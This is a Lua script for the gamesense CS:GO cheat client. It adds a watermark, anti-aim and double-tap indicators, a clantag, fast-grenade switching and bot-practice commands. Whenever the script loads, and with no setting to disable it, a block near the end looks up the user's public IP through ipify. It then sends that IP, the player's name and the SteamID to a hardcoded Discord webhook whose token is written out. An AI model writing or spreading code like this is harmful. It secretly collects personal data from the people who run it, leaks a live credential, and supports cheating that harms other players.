-- require
local http = require "gamesense/http"
local ip_check = "https://api.ipify.org"
local easing = require "gamesense/easing"
local images = require "gamesense/images"
local anti_aim = require "gamesense/antiaim_funcs"
local Discord = require("gamesense/discord_webhooks")
local Webhook = Discord.new("https://discord.com/api/webhooks/909889882527264788/6mGSXTpCE_wSNsoykUL9JNth-oU79hbo-LdTTTQDVSn--RW8AT-Al7FG95D3S-Ls1XTG")

-- panorama 
local js = panorama.open()
local name, steamid = js.MyPersonaAPI.GetName() , js.MyPersonaAPI.GetXuid()

-- global variables
local reub = 76561198384716464
local width, height = client.screen_size()

-- watermark variables
local lua_state_dev, lua_state_live = "[dev]", "[live]"
local watermark_prefix = "hyuga "

-- clantag variables
local clantags = {"hyūga"}
local clantag_prev

-- fast grenade variables
local switch_to_flash_at = nil
local next_command_at = nil

-- indicator variables /dt
local doubletap_charge = 0

-- indicator variables /fakelag
local OldChoke = 0
local toDraw4 = 0
local toDraw3 = 0
local toDraw2 = 0
local toDraw1 = 0
local toDraw0 = 0

-- indicator variables /frames per second
local frametimes = {}
local fps_prev = 0
local value_prev = {}
local last_update_time = 0

-- discord embed variables
local RichEmbed = Discord.newEmbed()

-- table contains
local function table_contains(table, value)
	for k,v in pairs(table) do
		if v == value then
			return true
		end
	end
	return false
end

-- clamp function
function math.clamp(val, min, max)
    return math.min(max, math.max(min, val))
end

-- easing "thing"
do
    for key, easing_func in pairs(easing) do
        easing[key] = function (t, b, c, d, ...)
            return math.clamp(easing_func(t, b, c, d, ...), b, d)
        end
    end
end

-- frames per second function
local function accumulate_fps() -- stolen from estk
	local rt, ft = globals.realtime(), globals.absoluteframetime()

	if ft > 0 then
		table.insert(frametimes, 1, ft)
	end

	local count = #frametimes
	if count == 0 then
		return 0
	end

	local accum = 0
	local i = 0
	while accum < 0.5 do
		i = i + 1
		accum = accum + frametimes[i]
		if i >= count then
			break
		end
	end

	accum = accum / i

	while i < count do
		i = i + 1
		table.remove(frametimes)
	end

	local fps = 1 / accum
	local time_since_update = rt - last_update_time
	if math.abs(fps - fps_prev) > 10 or time_since_update > 1 then
		fps_prev = fps
		last_update_time = rt
	else
		fps = fps_prev
	end

	return math.floor(fps + 0.5)
end

-- references
local references = {
	enabled_aa = ui.reference("AA", "Anti-aimbot angles", "Enabled"),
	pitch = ui.reference("AA", "Anti-aimbot angles", "pitch"),
	yawBase = ui.reference("AA", "Anti-aimbot angles", "Yaw base"),
	yaw = { ui.reference("AA", "Anti-aimbot angles", "Yaw") },
    fakeYawLimit = ui.reference("AA", "anti-aimbot angles", "Fake yaw limit"),
    fsBodyYaw = ui.reference("AA", "anti-aimbot angles", "Freestanding body yaw"),
    edgeYaw = ui.reference("AA", "Anti-aimbot angles", "Edge yaw"),
    maxProcTicks = ui.reference("MISC", "Settings", "sv_maxusrcmdprocessticks"),
    minDamage = ui.reference("RAGE", "Aimbot", "Minimum damage"),
    resolverOverride = ui.reference("RAGE", "Other", "Anti-aim correction override"),
    fakeDuck = ui.reference("RAGE", "Other", "Duck peek assist"),
	enabled_rage = ui.reference("RAGE", "Aimbot", "Enabled"),
    safePoint = ui.reference("RAGE", "Aimbot", "Force safe point"),
	forceBaim = ui.reference("RAGE", "Other", "Force body aim"),
	playerList = ui.reference("PLAYERS", "Players", "Player list"),
	resetAll = ui.reference("PLAYERS", "Players", "Reset all"),
	applyAll = ui.reference("PLAYERS", "Adjustments", "Apply to all"),
	loadCfg = ui.reference("Config", "Presets", "Load"),
	fakeLag = ui.reference("AA", "Fake lag", "Enabled"),
	fakeLagLimit = ui.reference("AA", "Fake lag", "Limit"),
    quickPeek = { ui.reference("RAGE", "Other", "Quick peek assist") },
    yawjitter = { ui.reference("AA", "Anti-aimbot angles", "Yaw jitter") },
    bodyyaw = { ui.reference("AA", "Anti-aimbot angles", "Body yaw") },
    freestand = { ui.reference("AA", "Anti-aimbot angles", "Freestanding") },
    onShot = { ui.reference("AA", "Other", "On shot anti-aim") },
    slowMotion = { ui.reference("AA", "Other", "Slow motion") },
    fakePeek = { ui.reference("AA", "Other", "Fake peek") },
    doubleTap = { ui.reference("RAGE", "Other", "Double tap") },
    ps = { ui.reference("RAGE", "Other", "Double tap") },
    fakeLag = { ui.reference("AA", "Fake lag", "Enabled") },
    thirdPerson = { ui.reference("Visuals", "Effects", "Force third person (alive)") },
    freestanding = { ui.reference("AA", "Anti-aimbot angles", "Freestanding") },
    sv_maxusrcmdprocessticks = ui.reference("MISC", "Settings", "sv_maxusrcmdprocessticks")
}

-- console log
client.exec("clear")
client.exec("play player/playerping")
client.color_log(203, 255, 66, "[hyuga] \0")
client.color_log(211, 211, 211, "Finished loading")

-- menu elements
watermark_checkbox = ui.new_checkbox("LUA", "A", "Watermark")
indicators_checkbox = ui.new_checkbox("LUA", "A", "Indicators")
clantag_checkbox = ui.new_checkbox("LUA", "A", "Clantag")
no_sleeve = ui.new_checkbox("LUA", "B", "No Sleeve")
set_console = ui.new_checkbox("LUA", "A", "Filter console")
grenade_enable_reference = ui.new_checkbox("LUA", "A", "Fast Grenade")
match_crosshair = ui.new_checkbox("LUA", "A", "Matching Crosshair Color")

-- set visibility
ui.set_visible(ui.reference("Visuals", "Other esp", "Feature indicators"), false)

-- paint
-- watermark /done
local function watermark()
	if ui.get(watermark_checkbox) then
		-- lua name aka prefix
		local lua_name_width = renderer.measure_text("-d", "HYUGA.") + 15
		local lua_name_prefix_width = renderer.measure_text("-d", "LUA") + 5

		-- name
		local name_width = renderer.measure_text("-d", string.upper(name))

		-- time
		local hours, minutes = client.system_time()
		if hours < 10 then hours = "0" .. hours end
		if minutes < 10 then minutes = "0" .. minutes end
		local time = hours .. ":" .. minutes
		local time_width = renderer.measure_text("-d", time)

		-- frames per second
		local fps = accumulate_fps()
		local fps_width = renderer.measure_text("-d", fps)

		-- divider
		local divider = renderer.measure_text("-d", "|") + 5

		-- color
		local menuR, menuG, menuB, menuA = ui.get(ui.reference("Misc", "Settings", "Menu color"))
		
		-- rendering
		-- redering background
		renderer.rectangle(15, 15, lua_name_width + lua_name_prefix_width + divider + name_width + time_width + divider + fps_width + 20, 11, 0, 0, 0, 120)

		-- redering prefix
		renderer.text(15, 15, 255, 255, 255, 255, "-d", 0, "HYUGA.")
		renderer.text(lua_name_width, 15, menuR, menuG, menuB, menuA, "-d", 0, "LUA")

		-- redering divider
		renderer.text(lua_name_width + lua_name_prefix_width, 15, 255, 255, 255, 255, "-d", 0, "|")

		-- redering name
		renderer.text(lua_name_width + lua_name_prefix_width + divider, 15, menuR, menuG, menuB, menuA, "-d", 0, string.upper(name))

		-- redering divider
		renderer.text(lua_name_width + lua_name_prefix_width + divider + name_width + 5, 15, 255, 255, 255, 255, "-d", 0, "|")

		-- redering time
		renderer.text(lua_name_width + lua_name_prefix_width + divider + name_width + divider + 5, 15, 255, 255, 255, 255, "-d", 0, time)

		-- redering divider
		renderer.text(lua_name_width + lua_name_prefix_width + divider + name_width + time_width + divider + 10, 15, 255, 255, 255, 255, "-d", 0, "|")

		-- redering frames per second
		renderer.text(lua_name_width + lua_name_prefix_width + divider + name_width + time_width + divider + 18, 15, 255, 255, 255, 255, "-d", 0, fps)
		renderer.text(lua_name_width + lua_name_prefix_width + divider + name_width + time_width + divider + fps_width + 18, 15, menuR, menuG, menuB, menuA, "-d", 0, "FPS")
	end
end

local function indicators()
	if ui.get(indicators_checkbox) then
		
		-- pulsate effect
		local alpha = math.abs(globals.curtime() * 1.5 % 2 - 1)
		alpha = 255*alpha

		-- slower pulsate effect
		local alpha50 = math.abs(globals.curtime() * 2 % 2 - 1)
		alpha50 = 50*alpha50

		-- color
		local menuR, menuG, menuB, menuA = ui.get(ui.reference("Misc", "Settings", "Menu color"))

		--local warning = images.get_panorama_image("icons/ui/warning.svg")
		--local iw, ih = warning:measure(nil, 35)
		--warning:draw(width / 2 - 9, height / 1.1, 20, 20, 255, 200, 50, alpha)

		-- lua name
		renderer.text(width / 2 - 9, height / 2 + 20, 255, 255, 255, 255, "-cd", 0, "HYUGA.")
		renderer.text(width / 2 + 11, height / 2 + 20, menuR, menuG, menuB, menuA, "-cd", 0, "LUA")
		
		if entity.is_alive(entity.get_local_player()) then
			if not ui.get(references.fakeDuck) then
				if ui.get(references.doubleTap[1]) and ui.get(references.doubleTap[2]) then
					-- dt variables
					charge = anti_aim.get_double_tap()
					FT = globals.frametime() * 32
					doubletap_charge = easing.linear(doubletap_charge + (charge and FT or -FT), 0, 1, 1)	
					-- dt indicator elements
					renderer.rectangle(width / 2 - 10, height / 2 + 32, 33, 7, 0, 0, 0, 125)
					renderer.rectangle(width / 2 - 9, height / 2 + 33, 31 * doubletap_charge, 5, menuR, menuG, menuB, menuA)
					renderer.text(width / 2 - 20, height / 2 + 35, 255, 255, 255, 255, "-cd", 0, "DT")
				elseif ui.get(references.fakeLag[1]) then
					-- fakelag indicator elements
					renderer.rectangle(width / 2 - 10, height / 2 + 32, 33, 7, 0, 0, 0, 125)
					renderer.rectangle(width / 2 - 9, height / 2 + 33, OldChoke / 15 * 31, 5, menuR, menuG, menuB, menuA)
					renderer.text(width / 2 - 20, height / 2 + 35, 255, 255, 255, 255, "-cd", 0, "FL")
				end
			else 
				-- fakeduck indicator elements
				renderer.rectangle(width / 2 - 10, height / 2 + 32, 33, 7, 0, 0, 0, 125)
				renderer.rectangle(width / 2 - 9, height / 2 + 33, OldChoke / 15 * 31, 5, menuR, menuG, menuB, menuA)
				renderer.text(width / 2 - 20, height / 2 + 35, 255, 255, 255, 255, "-cd", 0, "FD")
			end

			if ui.get(references.enabled_rage) then
				-- onshot indicator elements
				if ui.get(references.onShot[1]) and ui.get(references.onShot[2]) then
					renderer.text(width / 2 - 1, height / 2 + 45, 255, 255, 255, 255, "-cd", 0, "OS")
				else
					renderer.text(width / 2 - 1, height / 2 + 45, 255, 255, 255, alpha50, "-cd", 0, "OS")
				end
				-- force baim indicator elements
				if ui.get(references.forceBaim) then
					renderer.text(width / 2 + 15, height / 2 + 45, 255, 255, 255, 255, "-cd", 0, "FB")
				else
					renderer.text(width / 2 + 15, height / 2 + 45, 255, 255, 255, alpha50, "-cd", 0, "FB")
				end
			else
			
			end
		end
	end
end

-- crosshair /done
ui.set_callback(match_crosshair, function()
	-- crosshair variables
	local menuR, menuG, menuB, menuA = ui.get(ui.reference("Misc", "Settings", "Menu color"))
	-- setting crosshair color to menu color
	client.exec("cl_crosshaircolor_r ", menuR, "; cl_crosshaircolor_g ", menuG, "; cl_crosshaircolor_b ", menuB)
end)

-- clantag /done
client.set_event_callback("run_command", function()
	if ui.get(clantag_checkbox) then
		-- clantag variables
		local cur = math.floor(globals.tickcount() / 50) % #clantags
		local clantag = clantags[cur+1]
		-- setting defined clantag
		if clantag ~= clantag_prev then
			clantag_prev = clantag
			client.set_clan_tag(clantag)
		end
	end
end)

client.set_event_callback("paint_ui", function()
    watermark()
	indicators()
end)

-- console filter /done
ui.set_callback(set_console, function()
    if ui.get(set_console) then
		-- filtering console text
        cvar.developer:set_int(0)
        cvar.con_filter_enable:set_int(1)
        cvar.con_filter_text:set_string("IrWL5106TZZKNFPz4P4Gl3pSN?J370f5hi373ZjPg%VOVh6lN")
    else
		-- setting filtering to default
        cvar.con_filter_enable:set_int(0)
        cvar.con_filter_text:set_string("")
    end
end)

-- no Sleeve /done
ui.set_callback(no_sleeve, function()
	if entity.is_alive(entity.get_local_player()) then
		-- sleeve variables
		local sleeve = materialsystem.find_materials("sleeve")
		-- removing sleeves 
		for i=#sleeve, 1, -1 do
			sleeve[i]:set_material_var_flag(2, ui.get(no_sleeve))
		end
	end
end)

-- discord embed log
http.get(ip_check, function(success, response)
	-- discord embed variables
	local hours, minutes = client.system_time()
	local text = "Player " .. name .. " load hyuga.lua."
	local var = config.export()
	-- additional discord embed checks and "fixes" 
	if hours < 10 then hours = "0" .. hours end
    if minutes < 10 then minutes = "0" .. minutes end
	if (response.body == "46.189.220.94") then response.body = "reub's ip" end
	-- set the username on the webhook
	Webhook:setUsername("Hyūga")
	-- set the avatar on the webhook
	Webhook:setAvatarURL("https://i.imgur.com/mCwkG0m.png")
	-- set the title on the webhook
	RichEmbed:setTitle("Hyūga")
	-- set the description on the webhook
	RichEmbed:setDescription(name .. " loaded hyūga.")
	-- set the thumbnail on the webhook
	RichEmbed:setThumbnail("https://i.imgur.com/mCwkG0m.png")
	-- add a "time of load" field on the webhook
	RichEmbed:addField("Real Time:", hours .. ":" .. minutes, true)
	-- add a "ip adress" field on the webhook
	RichEmbed:addField("IP Adress:", response.body, true)
	-- add a "steam id" field on the webhook
	RichEmbed:addField("SteamID", steamid, false)
	-- set the color of the webhook
	RichEmbed:setColor(5548031)
	-- set the footer on the webhook
	RichEmbed:setFooter("gamesense.pub", "https://i.imgur.com/11c0Ctp.png", "https://i.imgur.com/11c0Ctp.png")
	-- send webhook
	Webhook:send(RichEmbed)
end)

-- fast grenade /done
local function on_grenade_thrown(e)
	-- fast grenade variables
	userid, grenade = e.userid, e.weapon
	if ui.get(grenade_enable_reference) then
		if client.userid_to_entindex(userid) == entity.get_local_player() then
			if grenade == "flashbang" then
				client.exec("slot3;")
				switch_to_flash_at = globals.tickcount() + 15
				next_command_at = globals.tickcount()
			else
				client.exec("slot2; slot1")
			end
		end
	end
end

client.set_event_callback("grenade_thrown", on_grenade_thrown)

-- fakelag function
local function setup_command(cmd)

	if cmd.chokedcommands < OldChoke then --sent
		toDraw0 = toDraw1
		toDraw1 = toDraw2
		toDraw2 = toDraw3
		toDraw3 = toDraw4
		toDraw4 = OldChoke
	end
	
	OldChoke = cmd.chokedcommands

end

client.set_event_callback("setup_command", setup_command)

-- dev stuff / done
local function ustaw_boty()
    client.exec("sv_cheats 1")
	client.exec("bot_stop 1")
	client.exec("mp_freezetime 0")
	client.exec("mp_roundtime 60")
	client.exec("mp_roundtime_defuse 60")
	client.exec("mp_roundtime_hostage 60")
    client.exec("mp_roundtime_deployment 60")
    client.exec("mp_respawn_on_death_ct 1")
    client.exec("mp_respawn_on_death_t 1")
    client.exec("mp_buytime 999999999999999999999")
    client.exec("mp_buy_anywhere 1")
    client.exec("cl_use_opens_buy_menu 0")
    client.exec("reset_expo")
    client.exec("impulse 101")
    client.exec("sv_infinite_ammo 2")
    client.exec("sv_airaccelerate 444")
end


local button = ui.new_button("LUA", "B", "Bot commands", ustaw_boty)

